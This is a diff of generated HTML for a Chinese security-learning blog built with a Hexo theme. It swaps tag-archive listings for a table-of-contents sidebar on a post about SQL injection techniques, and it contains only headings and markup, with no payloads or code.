-      <a class="archive-article-title" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">SQL注入原理与实践进阶</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">MySQL数据库的特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL内置函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB"><span class="toc-number">1.1.1.</span> <span class="toc-text">获取数据库类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E7%B1%BB"><span class="toc-number">1.1.2.</span> <span class="toc-text">功能类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E5%86%85%E7%BD%AE%E7%B3%BB%E7%BB%9F%E8%A1%A8"><span class="toc-number">1.2.</span> <span class="toc-text">MySQL内置系统表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%8A%80%E5%B7%A7"><span class="toc-number">2.</span> <span class="toc-text">MySQL联合查询技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%8A%80%E5%B7%A7"><span class="toc-number">2.1.</span> <span class="toc-text">获取数据的基本技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E6%8A%80%E5%B7%A7"><span class="toc-number">2.2.</span> <span class="toc-text">编码技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7"><span class="toc-number">3.</span> <span class="toc-text">MySQL报错注入技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E7%9B%B2%E6%B3%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">4.</span> <span class="toc-text">MySQL盲注技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">5.1.</span> <span class="toc-text">正则表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.3.</span> <span class="toc-text">SQL注入步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AF%B9%E6%9F%90%E4%B8%AA%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%88%86%E4%B8%BA%E5%9B%9B%E4%B8%AA%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.3.1.</span> <span class="toc-text">1.对某个网站进行注入，分为四个步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-MySQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">5.3.2.</span> <span class="toc-text">2.MySQL手工注入的方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-MySQL%E4%B8%AD%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.3.</span> <span class="toc-text">3.MySQL中如何进行对应的注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">5.3.4.</span> <span class="toc-text">4.联合查询的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#EXP-amp-PoC"><span class="toc-number">5.3.4.1.</span> <span class="toc-text">EXP &amp; PoC</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%81%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">5.3.5.</span> <span class="toc-text">5.报错注入、盲注的流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.3.6.</span> <span class="toc-text">6.盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">常见的过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by"><span class="toc-number">7.</span> <span class="toc-text">order by</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">8.</span> <span class="toc-text">Windows下的命令</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-03-17T08:28:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-17</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/">PHP与SQL进阶</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-03-16T02:00:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">JavaScript代码进阶</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-03-15T06:47:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">HTML代码进阶</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -416,9 +683,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: false,
